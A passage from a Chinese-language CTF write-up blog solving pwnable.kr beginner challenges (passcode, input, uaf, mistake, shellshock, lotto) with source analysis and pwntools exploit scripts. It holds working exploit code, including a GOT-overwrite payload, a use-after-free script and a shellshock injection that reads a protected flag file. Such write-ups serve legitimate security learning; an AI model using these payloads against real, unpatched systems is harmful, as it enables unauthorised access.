class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">__Auther__ = &apos;L1B0&apos;</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">io = process(&apos;./passcode&apos;)</span><br><span class="line"></span><br><span class="line">payload = &apos;a&apos;*0x60</span><br><span class="line">payload += p32(0x0804A000) + &apos;\n&apos;</span><br><span class="line">#0x80485E3 = 134514147</span><br><span class="line">payload += &apos;134514147\n&apos;</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="第二种方法：python-c"><a href="#第二种方法：python-c" class="headerlink" title="第二种方法：python -c"></a>第二种方法：python -c</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;print &apos;a&apos;*0x60+&apos;\x00\xa0\x04\x08\n&apos;+&apos;134514147\n&apos;&quot; | ./passcode</span><br></pre></td></tr></table></figure><h3 id="input"><a href="#input" class="headerlink" title="input"></a>input</h3><blockquote><p>Mom? how can I pass my input to a computer program?</p><p>On Jul 31,2018</p></blockquote><p>这题考察的都是我不会的。。。我真菜</p><h4 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// argv</span><br><span class="line">if(argc != 100) return 0;</span><br><span class="line">if(strcmp(argv[&apos;A&apos;],&quot;\x00&quot;)) return 0;</span><br><span class="line">if(strcmp(argv[&apos;B&apos;],&quot;\x20\x0a\x0d&quot;)) return 0;</span><br><span class="line">printf(&quot;Stage 1 clear!\n&quot;);</span><br></pre></td></tr></table></figure><p>简单说一下<code>argc</code>和<code>argv</code>的含义</p><p>argc：外部命令参数的个数</p><p>argv：存储外部命令参数的数组，其中argv[0]为可执行文件名</p><p>比如说我们执行<code>./hello 1 2 3</code>，这时<code>argc = 4</code>，<code>argv = [&#39;./hello&#39;,&#39;1&#39;,&#39;2&#39;,&#39;3&#39;]</code></p><p>清楚了这两个的含义之后就能够很清楚的分析上面的代码</p><p>首先<code>argc == 100</code>即命令参数个数为99，并且<code>argv[&#39;A&#39;] = argv[65] = &quot;\x00&quot;</code> <code>argv[&#39;B&#39;] = argv[66] = &quot;\x20\x0a\x0d&quot;</code>即可通过第一关</p><p>我用<code>pwntools</code>实现的这个目的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">#level1</span><br><span class="line">argv = [ &quot;a&quot; for i in range(100) ]</span><br><span class="line">argv[0] = &quot;./input11&quot;</span><br><span class="line">argv[ord(&apos;A&apos;)] = &quot;\x00&quot;</span><br><span class="line">#print libc.strcmp(sys.argv[ord(&apos;A&apos;)],&quot;\x00&quot;)</span><br><span class="line">argv[ord(&apos;B&apos;)] = &quot;\x20\x0a\x0d&quot;</span><br><span class="line">io = process(argv = argv)</span><br><span class="line">io.recv()</span><br></pre></td></tr></table></figure><h4 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// stdio</span><br><span class="line">char buf[4];</span><br><span class="line">read(0, buf, 4);</span><br><span class="line">if(memcmp(buf, &quot;\x00\x0a\x00\xff&quot;, 4)) return 0;</span><br><span class="line">read(2, buf, 4);</span><br><span class="line">       if(memcmp(buf, &quot;\x00\x0a\x02\xff&quot;, 4)) return 0;</span><br><span class="line">printf(&quot;Stage 2 clear!\n&quot;);</span><br></pre></td></tr></table></figure><p>这里需要了解的是read的三种模式，在<code>0x00 fd</code>题目中有提到，不再赘述</p><p>第一个条件：在<code>stdin</code>模式中读取4个字节的数据赋值给buf并且buf = “\x00\x0a\x00\xff”</p><p>第二个条件：在<code>stderr</code>模式中读取4个字节的数据赋值给buf并且buf = “\x00\x0a\x02\xff”</p><p>由于python大法好，这个条件可以轻松实现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#level2</span><br><span class="line">stdinr,stdinw = os.pipe()# 建立stdin的读和写之间的管道</span><br><span class="line">stderrr,stderrw = os.pipe()# 同理</span><br><span class="line">os.write(stdinw,&quot;\x00\x0a\x00\xff&quot;)# 向stdin的写入数据</span><br><span class="line">os.write(stderrw,&quot;\x00\x0a\x02\xff&quot;)# 同理</span><br><span class="line">io = process( argv = argv, stdin = stdinr, stderr = stderrr )</span><br></pre></td></tr></table></figure><h4 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// env</span><br><span class="line">if(strcmp(&quot;\xca\xfe\xba\xbe&quot;, getenv(&quot;\xde\xad\xbe\xef&quot;))) return 0;</span><br><span class="line">printf(&quot;Stage 3 clear!\n&quot;);</span><br></pre></td></tr></table></figure><p>通过百度了解到<code>getenv</code>是获取环境变量的内容的函数</p><blockquote><p>char <em>getenv(const char</em> name);</p><p>getenv()用来取得参数name环境变量的内容。参数name为环境变量的名称，如果该变量存在则会返回指向该内容的指针。环境变量的格式为name＝value。</p></blockquote><p>这个部分用<code>pwntools</code>也可以很容易的实现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dic = &#123;&quot;\xde\xad\xbe\xef&quot;:&quot;\xca\xfe\xba\xbe&quot;&#125;</span><br><span class="line">io = process( argv = argv, env = dic, stdin = stdinr, stderr = stderrr )</span><br></pre></td></tr></table></figure><h4 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// file</span><br><span class="line">FILE* fp = fopen(&quot;\x0a&quot;, &quot;r&quot;);</span><br><span class="line">if(!fp) return 0;</span><br><span class="line">if( fread(buf, 4, 1, fp)!=1 ) return 0;</span><br><span class="line">if( memcmp(buf, &quot;\x00\x00\x00\x00&quot;, 4) ) return 0;</span><br><span class="line">fclose(fp);</span><br><span class="line">printf(&quot;Stage 4 clear!\n&quot;);</span><br></pre></td></tr></table></figure><p>这里简单说明一下<code>fread</code>函数的功能</p><blockquote><p>int fread(void <em>ptr, int size, int nitems, FILE</em> stream);</p><p>ptr指针存储读取到的数据，size表示单个元素的大小，nitems表示元素的个数，stream表示提供数据的文件指针，fread函数返回的是成功读取元素的个数</p></blockquote><p>那么level4中的条件就是需要从文件<code>\x0a</code>中读取一个元素，这个元素必须是<code>\x00\x00\x00\x00</code></p><p>这个条件也挺容易实现，我们只需要生成一个名为<code>\x0a</code>的文件，且内容为<code>\x00\x00\x00\x00</code>即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#level4 </span><br><span class="line">with open(&quot;\x0a&quot;,&apos;w&apos;) as x:</span><br><span class="line">    x.write(&quot;\x00\x00\x00\x00&quot;)</span><br><span class="line">    x.close()</span><br></pre></td></tr></table></figure><h4 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">// network</span><br><span class="line">int sd, cd;</span><br><span class="line">struct sockaddr_in saddr, caddr;</span><br><span class="line">sd = socket(AF_INET, SOCK_STREAM, 0);</span><br><span class="line">if(sd == -1)&#123;</span><br><span class="line">    printf(&quot;socket error, tell admin\n&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">saddr.sin_family = AF_INET;</span><br><span class="line">saddr.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">saddr.sin_port = htons( atoi(argv[&apos;C&apos;]) );</span><br><span class="line">if(bind(sd, (struct sockaddr*)&amp;saddr, sizeof(saddr)) &lt; 0)&#123;</span><br><span class="line">    printf(&quot;bind error, use another port\n&quot;);</span><br><span class="line">   return 1;</span><br><span class="line">&#125;</span><br><span class="line">listen(sd, 1);</span><br><span class="line">int c = sizeof(struct sockaddr_in);</span><br><span class="line">cd = accept(sd, (struct sockaddr *)&amp;caddr, (socklen_t*)&amp;c);</span><br><span class="line">if(cd &lt; 0)&#123;</span><br><span class="line">    printf(&quot;accept error, tell admin\n&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">if( recv(cd, buf, 4, 0) != 4 ) return 0;</span><br><span class="line">if(memcmp(buf, &quot;\xde\xad\xbe\xef&quot;, 4)) return 0;</span><br><span class="line">printf(&quot;Stage 5 clear!\n&quot;);</span><br></pre></td></tr></table></figure><p>这一大堆socket代码都是啥啥啥，对c的socket了解很少，看的贼费劲</p><p>大致条件是通信的端口(port)是argv[‘C’]的值，而INADDR_ANY会自动填入本机ip地址</p><p>那么我们建立好通信之后在发送<code>\xde\xad\xbe\xef</code>即可</p><h4 id="小trick"><a href="#小trick" class="headerlink" title="小trick"></a>小trick</h4><p>在tmp文件夹里我们可以运行自己的脚本</p><ul><li>从本地复制文件到远程</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -P 2222 filename input2@pwnable.kr:/tmp/</span><br></pre></td></tr></table></figure><ul><li>软链接flag</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln /home/input2/flag flag</span><br></pre></td></tr></table></figure><p>然而不知道为啥都clear了cat不到flag，发现tmp文件夹里有个<strong>flag文件夹</strong>在搅屎。。。</p><p>于是自己在里面建了个文件夹，再链接一下flag即可，耶:-)</p><p><img src="http://wx3.sinaimg.cn/mw690/0060lm7Tly1fttdsmjvzpj30hs0dlwig.jpg" alt="img"></p><h4 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">__Auther__ = &apos;L1B0&apos;</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">import os</span><br><span class="line">from socket import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">#libc = CDLL(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;) </span><br><span class="line">argv = []</span><br><span class="line">dic = []</span><br><span class="line"></span><br><span class="line">#log_level2 </span><br><span class="line">stdinr,stdinw = os.pipe()</span><br><span class="line">stderrr,stderrw = os.pipe()</span><br><span class="line">os.write(stdinw,&quot;\x00\x0a\x00\xff&quot;)</span><br><span class="line">os.write(stderrw,&quot;\x00\x0a\x02\xff&quot;)</span><br><span class="line">    </span><br><span class="line">#level1</span><br><span class="line">argv = [ &quot;a&quot; for i in range(100) ]</span><br><span class="line">#argv[0] = &quot;./input&quot;</span><br><span class="line">argv[0] = &quot;/home/input2/input&quot;</span><br><span class="line">argv[ord(&apos;A&apos;)] = &quot;\x00&quot;</span><br><span class="line">#print libc.strcmp(sys.argv[ord(&apos;A&apos;)],&quot;\x00&quot;)</span><br><span class="line">argv[ord(&apos;B&apos;)] = &quot;\x20\x0a\x0d&quot;</span><br><span class="line">argv[ord(&apos;C&apos;)] = &quot;8888&quot;</span><br><span class="line"></span><br><span class="line">#level3</span><br><span class="line">dic = &#123;&quot;\xde\xad\xbe\xef&quot;:&quot;\xca\xfe\xba\xbe&quot;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#level4 </span><br><span class="line">with open(&quot;\x0a&quot;,&apos;w&apos;) as x:</span><br><span class="line">    x.write(&quot;\x00\x00\x00\x00&quot;)</span><br><span class="line">    x.close()</span><br><span class="line"></span><br><span class="line">if __name__ ==  &quot;__main__&quot;:</span><br><span class="line">    </span><br><span class="line">    sd = socket(AF_INET, SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">    io = process( argv = argv,  env = dic, stdin = stdinr, stderr = stderrr )</span><br><span class="line">     </span><br><span class="line">    #level5</span><br><span class="line">    </span><br><span class="line">    host = &quot;pwnable.kr&quot;</span><br><span class="line">    port = int(argv[ord(&apos;C&apos;)])</span><br><span class="line"></span><br><span class="line">    sd.connect((host,port))</span><br><span class="line">    sd.send(&quot;\xde\xad\xbe\xef&quot;)</span><br><span class="line">    sd.close()</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br><span class="line">    io.close()</span><br></pre></td></tr></table></figure><h3 id="uaf"><a href="#uaf" class="headerlink" title="uaf"></a>uaf</h3><blockquote><p>Description：Mommy, what is Use After Free bug?</p><p>On Aug 1,2018</p></blockquote><p><code>Use After Free</code></p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">__Auther__ = &apos;L1B0&apos;</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">#elf = ELF(&apos;./uaf&apos;)</span><br><span class="line"></span><br><span class="line">len = &apos;16&apos;</span><br><span class="line">sys_addr = p64(0401568)</span><br><span class="line"></span><br><span class="line">f = open(&apos;addr.txt&apos;,&apos;w&apos;)</span><br><span class="line">f.write(sys_addr)</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">io = process( argv = [&apos;/home/uaf//uaf&apos;,len,&apos;addr.txt&apos;] )</span><br><span class="line"></span><br><span class="line">io.sendlineafter(&quot;free\n&quot;,&apos;3&apos;)</span><br><span class="line">io.sendlineafter(&quot;free\n&quot;,&apos;2&apos;)</span><br><span class="line">io.sendlineafter(&quot;free\n&quot;,&apos;2&apos;)</span><br><span class="line">io.sendlineafter(&quot;free\n&quot;,&apos;1&apos;)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>先把脚本放到<code>/tmp</code>文件夹里，然后<code>cat /home/uaf/flag</code>即可</p><h3 id="mistake"><a href="#mistake" class="headerlink" title="mistake"></a>mistake</h3><blockquote><p>Description：We all make mistakes, let’s move on.<br>(don’t take this too seriously, no fancy hacking skill is required at all)</p><p>This task is based on real event<br>Thanks to dhmonkey</p><p>hint : operator priority</p><p>On Aug 1,2018</p></blockquote><p>题目提示是运算符的优先级</p><p>源码如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line"></span><br><span class="line">#define PW_LEN 10</span><br><span class="line">#define XORKEY 1</span><br><span class="line"></span><br><span class="line">void xor(char* s, int len)&#123;</span><br><span class="line">    int i;</span><br><span class="line">    for(i=0; i&lt;len; i++)&#123;</span><br><span class="line">        s[i] ^= XORKEY;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char* argv[])&#123;</span><br><span class="line">    </span><br><span class="line">    int fd;</span><br><span class="line">    if(fd=open(&quot;/home/mistake/password&quot;,O_RDONLY,0400) &lt; 0))&#123;</span><br><span class="line">        printf(&quot;can&apos;t open password %d\n&quot;, fd);</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    printf(&quot;do not bruteforce...\n&quot;);</span><br><span class="line">    sleep(time(0)%20);</span><br><span class="line"></span><br><span class="line">    char pw_buf[PW_LEN+1];</span><br><span class="line">    int len;</span><br><span class="line">    if(!( len = read(fd,pw_buf,PW_LEN) &gt; 0 ))&#123;</span><br><span class="line">        printf(&quot;read error\n&quot;);</span><br><span class="line">        close(fd);</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    char pw_buf2[PW_LEN+1];</span><br><span class="line">    printf(&quot;input password : &quot;);</span><br><span class="line">    scanf(&quot;%10s&quot;, pw_buf2);</span><br><span class="line"></span><br><span class="line">    // xor your input</span><br><span class="line">    xor(pw_buf2, 10);</span><br><span class="line"></span><br><span class="line">    if(!strncmp(pw_buf, pw_buf2, PW_LEN))&#123;</span><br><span class="line">        printf(&quot;Password OK\n&quot;);</span><br><span class="line">        system(&quot;/bin/cat flag\n&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        printf(&quot;Wrong Password\n&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    close(fd);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>能在优先级上出现问题的就是有两个或三个运算符出现在一句代码中，并且没有括号表明优先级的次序。</p><p>看一遍源码会发现有两行代码有点奇怪</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fd=open(&quot;/home/mistake/password&quot;,O_RDONLY,0400) &lt; 0</span><br><span class="line">len = read(fd,pw_buf,PW_LEN) &gt; 0</span><br></pre></td></tr></table></figure><p><a href="https://www.cnblogs.com/ace-wu/p/6640186.html" target="_blank" rel="noopener">linux下open函数的用法</a>，这里不再赘述</p><p>首先我们知道优先级从大到小依次是：’&gt;’，’&lt;’，’=’</p><p>那么第一句代码的执行顺序就是<code>fd = ( open(&quot;/home/mistake/password&quot;,O_RDONLY,0400) &lt; 0 )</code></p><p>先以只读方式打开password文件，并且0400代表该文件的所有者具有读取的权限，open函数返回的值在欲检查的权限都通过核查的情况下返回0，否则返回-1。我们假设文件成功打开，那么返回0，先和小于0比较，表达式值为0，再赋给fd。所以这里的fd在代码执行完毕后并不是我们所想的返回一个password的文件流，而是等于0。</p><p>第二句代码的执行顺序和第一句类似，这里read函数中<code>fd=0</code>意味着是从<code>stdin</code>即标准输入流中读取数据，所以实际上<code>pw_buf</code>的内容不是<code>password</code>，而是我们用户的输入作为<code>pw_buf</code>，这也是为什么可执行文件mistake在运行时不直接出现<code>input password</code>字样的原因。</p><p>那么就相当于<code>password</code>掌握在自己手上，只需通过<code>xor</code>校验即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mistake@ubuntu:~$ ./mistake </span><br><span class="line">do not bruteforce...</span><br><span class="line">1111111111</span><br><span class="line">input password : 0000000000</span><br><span class="line">Password OK</span><br><span class="line">**********************************************</span><br></pre></td></tr></table></figure><h3 id="shellshock"><a href="#shellshock" class="headerlink" title="shellshock"></a>shellshock</h3><blockquote><p>Description：Mommy, there was a shocking news about bash.<br>I bet you already know, but lets just make it sure :)</p><p>On Aug 1,2018</p></blockquote><p>原理</p><blockquote><p>shellshock是一个14年爆出的漏洞，导致漏洞出问题的是以”(){”开头定义的环境变量在命令ENV中解析成函数后，Bash执行未退出，而是继续解析并执行shell命令，而其核心的原因在于在输入的过滤中没有严格限制边界，也没有做出合法化的参数判断。–<a href="https://www.linuxidc.com/Linux/2014-10/107925.htm" target="_blank" rel="noopener">Linux公社</a></p></blockquote><p>测试一下发现给的bash确实有shellshock漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shellshock@ubuntu:~$ env x=&apos;() &#123; :;&#125;; echo vulnerable&apos; ./bash -c &apos;echo hello&apos;</span><br><span class="line">vulnerable</span><br><span class="line">hello</span><br></pre></td></tr></table></figure><p>目录下还有shellshock的源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">    setresuid(getegid(), getegid(), getegid());</span><br><span class="line">    setresgid(getegid(), getegid(), getegid());</span><br><span class="line">    system(&quot;/home/shellshock/bash -c &apos;echo shock_me&apos;&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看一下文件的权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">shellshock@ubuntu:~$ ls -l</span><br><span class="line">total 960</span><br><span class="line">-r-xr-xr-x 1 root shellshock     959120 Oct 12  2014 bash</span><br><span class="line">-r--r----- 1 root shellshock_pwn     47 Oct 12  2014 flag</span><br><span class="line">-r-xr-sr-x 1 root shellshock_pwn   8547 Oct 12  2014 shellshock</span><br><span class="line">-r--r--r-- 1 root root              188 Oct 12  2014 shellshock.c</span><br></pre></td></tr></table></figure><p>可以看到flag和shellshock都属于shellshock_pwn这个组，如果我们获得了shellshock_pwn的root权限，那么就可以读取flag的内容</p><p>分析一下shellshock.c的代码，getegid函数能获取当前有效组的识别码，这里获取的就是shellshock_pwn组，而setresuid和setresgid是分别将组标识号和用户标识号都设置为shellshock_pwn组的识别号。那么运行shellshock之后我们就有了读取flag的权限。</p><p>payload：<code>env x=&#39;() { :;}; ./bash -c &quot;cat flag&quot;&#39; ./shellshock</code></p><h3 id="lotto"><a href="#lotto" class="headerlink" title="lotto"></a>lotto</h3><blockquote><p>Description：Mommy! I made a lotto program for my homework.<br>do you want to play?</p><p>On Aug 1,2018</p></blockquote><p>这就是个猜号码的程序，但是代码有bug</p><p>关键如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">for ( i = 0; i &lt;= 5; ++i )</span><br><span class="line">  buf[i] = (unsigned __int8)buf[i] % 45u + 1; </span><br><span class="line"></span><br><span class="line">for ( j = 0; j &lt;= 5; ++j )</span><br><span class="line">&#123;</span><br><span class="line">  for ( k = 0; k &lt;= 5; ++k )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( buf[j] == submit[k] )</span><br><span class="line">      ++v3;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">if ( v3 == 6 )</span><br><span class="line">  system(&quot;/bin/cat flag&quot;);</span><br></pre></td></tr></table></figure><p><code>buf</code>是程序生成的数组，长度为6，但是被模了45，范围缩小很多</p><p><code>submit</code>是我们的输入，长度也为6</p><p>其实要达到<code>v3 == 6</code>很简单，原因是<strong>双重循环</strong> 。我们只需输入一个长度为6，每个字符都一样的字符串，然后爆破即可。因为只要碰到和<code>submit</code>数组里一个元素相等，那么<code>v3 == 6</code>就稳了。</p><p>exp如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">__Auther__ = &apos;L1B0&apos;</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">io = process(&apos;./lotto&apos;)</span><br><span class="line"></span><br><span class="line">for i in range(46):</span><br><span class="line"></span><br><span class="line">    my_byte = chr(i)*6</span><br><span class="line">    io.sendline(&apos;1&apos;)</span><br><span class="line">    io.sendlineafter(&quot;: &quot;,my_byte)</span><br><span class="line">    a = io.recvline()</span><br><span class="line">    if a != &quot;Lotto Start!\n&quot;:</span><br><span class="line">        break</span><br><span class="line">        </span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;这里整理一下自己在pwnable.kr的Toddler’s-Bottle专题的wp&lt;/p&gt;
&lt;p&gt;只放思路，不放flag:-)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;fd&quot;&gt;&lt;a href=&quot;#fd&quot; class=&quot;headerlink&quot; title=&quot;fd&quot;&gt;&lt;/a&gt;fd&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;Description：Mommy! what is a file descriptor in Linux?&lt;/p&gt;
&lt;p&gt;On Jul 30th,2018&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;首先连上ssh，ls看到有三个文件：fd,fd.c,flag&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://l1b0.fun/categories/CTF/"/>
    
    
      <category term="Pwnable-Kr" scheme="https://l1b0.fun/tags/Pwnable-Kr/"/>
    
